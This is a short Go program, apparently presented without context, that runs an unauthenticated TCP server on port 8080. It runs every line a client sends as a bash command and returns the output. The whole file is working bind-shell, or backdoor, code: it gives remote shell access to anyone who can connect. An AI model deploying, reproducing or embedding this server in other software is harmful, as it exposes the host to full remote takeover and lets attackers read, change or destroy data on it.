package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
)

func main() {
	fmt.Println("Start server...")
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("Error while running server:", err)
		return
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error while accepting server:", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	command, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("Error while reading command:", err)
		return
	}
	command = command[:len(command)-1]

	fmt.Println("Command accepted:", command)

	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error while executing command:", err)
		conn.Write([]byte("Error while executing command: " + err.Error() + "\n"))
		return
	}

	conn.Write(output)
}
